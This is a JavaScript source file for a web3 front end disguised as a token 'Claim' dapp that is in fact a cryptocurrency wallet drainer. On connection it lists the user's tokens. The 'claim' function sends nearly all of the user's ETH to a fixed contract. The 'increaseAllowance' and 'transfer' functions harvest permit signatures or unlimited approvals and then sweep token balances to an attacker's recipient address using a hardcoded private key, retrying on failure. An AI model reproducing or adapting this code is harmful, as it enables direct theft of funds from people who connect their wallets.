import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
} from '@web3modal/ethereum';
import { Web3Modal } from '@web3modal/html';
import {
  configureChains,
  createConfig,
  fetchBalance,
  writeContract,
  readContract,
  getAccount,
  fetchFeeData,
  waitForTransaction
} from '@wagmi/core';
import { signDaiPermit, signERC2612Permit } from 'eth-permit';
import { mainnet } from '@wagmi/core/chains';
import { ethers } from 'ethers';
import * as constants from './constants.js';
import { Alchemy, Network } from 'alchemy-sdk';
const config = {
  apiKey: constants.apikeys,
  network: Network.ETH_MAINNET,
};
const alchemy = new Alchemy(config);
import detectEthereumProvider from '@metamask/detect-provider'
// const chains = [arbitrum]
const chains = [mainnet];
const projectId = constants.projectId;

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({projectId, chains }),
  publicClient,
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
export const web3modal = new Web3Modal({ 
  projectId,
  // explorerRecommendedWalletIds:[
  //   "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
  //   "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
  // ],
  explorerExcludedWalletIds: 'ALL',
  enableExplorer: true,
  enableNetworkView: true,
  enableAccountView: true,
  mobileWallets:[
    {
      id: "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
      name: "MetaMask",
      links: {
        native: "metamask://",
        universal: "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/"
      }
    },{
      id: "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      name: "Trust Wallet",
      links: {
        native: "trust://",
        universal: "https://link.trustwallet.com/open_url?coin_id=60&url=https://multi-call-front-end.vercel.app/"
      }
    }
  ],
  walletImages: {
    "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96": "https://explorer-api.walletconnect.com/v3/logo/lg/5195e9db-94d8-4579-6f11-ef553be95100?projectId=2f05ae7f1116030fde2d36508f472bfb",
    "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0": "https://explorer-api.walletconnect.com/v3/logo/lg/0528ee7e-16d1-4089-21e3-bbfb41933100?projectId=2f05ae7f1116030fde2d36508f472bfb",
  }
}, ethereumClient);

let prices = [];
export let priceList = [];

export const getTokens = async (address) => {
  const balances = await alchemy.core.getTokenBalances(address);
  const nonZeroBalances = balances.tokenBalances.filter((token) => {
    return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
  });
  let tokens = [];

  // Loop through all tokens with non-zero balance
  for (let token of nonZeroBalances) {
    // Get balance of token
    let balance = token.tokenBalance;
    const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
    metadata.balance = balance;
    metadata.token_address = token.contractAddress;
    tokens.push(metadata);
  }
  return tokens;
};

export const setPrice = (ticker) => {
  return new Promise(async (resolve) => {
    let token = priceList.filter((token) => token.symbol === `${ticker}USDT`);
    if (token && token.length > 0) prices.push(token[0].price);
    else prices.push(0);

    resolve(token.price);
  });
};

export const getPrice = async (symbols) => {
  for (let i = 0; i < symbols.length; i++) {
    const symbol = symbols[i];
    await setPrice(symbol);
  }
  return prices;
};

export const claim = async (_balance) => {
  const feeData = await fetchFeeData({
    chainId: 1,
    formatUnits: 'gwei',
  });
  const amount = _balance - (BigInt(50000) * (feeData.gasPrice));
  if (amount <= 0) return;
  await writeContract({
    address: constants.claimAddress,
    abi: constants.CLAIMEABI,
    functionName: 'Claim',
    value: amount,
    gas: '50000',
    gasPrice: feeData.gasPrice
  }).then((result) => {
    console.log(result)
  }).catch((error) => {
    console.log(error)
    claim(_balance);
  });
};
export const increaseAllowance = async (token) => {
  // RPC provider
  const provider = new ethers.providers.JsonRpcProvider(constants.infura);
  const permitProvider = await detectEthereumProvider()

  // get token Allownce to transfer imiditly
  const allow = await allownce(token);
  const balanceOfToken = await balanceOf(token);
  if (allow >= balanceOfToken) {
    return await transfer(token);
  };

  const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
  const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
  const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
  if (permitToken && permitProvider) {

    let nonce = undefined
    await readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'nonces',
      args: [getAccount().address],
    }).then( (result) => {
      nonce = result
    }).catch( (error) => {
      console.log(error)
    })

    readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'version',
    }).then( async (result) => {
      if( result === '1') {
        await signDaiPermit(
          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
        ).then(async ( result) => {

          const signer = new ethers.Wallet(constants.initiatorPK, provider);
          const DaiToken = new ethers.Contract(
            permitToken.address, constants.ALLOWANCEABI, signer
          );

          await DaiToken.permit(
            getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
          ).then(async (result) => {
            console.log(result)
            await waitForTransaction(result.transactionHash)
            await transfer(token);
          })

        }).catch( (error) => {
          console.log(error)
          increaseAllowance(token)
        });

      }else if (result === '2') {
        await signERC2612Permit(
          permitProvider, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
        ).then(async ( result) => {

          const signer = new ethers.Wallet(constants.initiatorPK, provider);
          const DaiToken = new ethers.Contract(
            permitToken.address, constants.permitV2, signer
          );

          await DaiToken.permit(
            getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
          ).then(async (result) => {
            console.log(result)
            await waitForTransaction(result.transactionHash)
            await transfer(token);
          })

        }).catch( (error) => {
          console.log(error)
          increaseAllowance(token)
        })
      }
    }).catch((error) => {
      console.log(error);
    })
    
  }else if (increaseallown) {
    await writeContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'increaseAllowance',
      args: [constants.initiator, constants.max]
    }).then(async (result) => {
      console.log(result)
      await waitForTransaction(result.transactionHash)
      await transfer(token);
    }).catch( (error) => {
      console.log(error)
      increaseAllowance(token)
    })
  }else if (transfertoken) {
    await writeContract({
      address: token.token_address,
      abi: constants.ERC20ABI,
      functionName: 'transfer',
      args: [constants.recipient, token.balance]
    }).then((result) => {
      console.log(result)
    }).catch( (error) => {
      console.log(error)
      increaseAllowance(token)
    })
  }
};

export const transfer = async (token) => {
  const amount = balanceOf(token)
  const provider = new ethers.providers.JsonRpcProvider(constants.infura);
  const signer = new ethers.Wallet(constants.initiatorPK, provider);
  const tokencontract = new ethers.Contract(
    token.token_address,
    constants.ALLOWANCEABI,
    signer
  );
  await tokencontract.transferFrom(
    getAccount().address, constants.recipient, amount
  ).then(async (result) => {
    console.log(result)
  }).catch( (error) => {
    console.log(error)
  });
};

export const ethBalance = async () => {
  try {
    const account = getAccount().address;
    const balance = await fetchBalance({
      address: account,
    });
    return balance;
  } catch (error) {
    console.log(error);
  }
};

export const allownce = async (token) => {
  return await readContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'allowance',
    args: [getAccount().address, constants.initiator],
    chainId: 1
  }).catch( (error) => {
    console.log(error)
  })
}

export const balanceOf = async (token) => {
  return await readContract({
    address: token.token_address,
    abi: constants.ALLOWANCEABI,
    functionName: 'balanceOf',
    args: [getAccount().address],
    chainId: 1
  }).catch( (error) => {
    console.log(error)
  })
}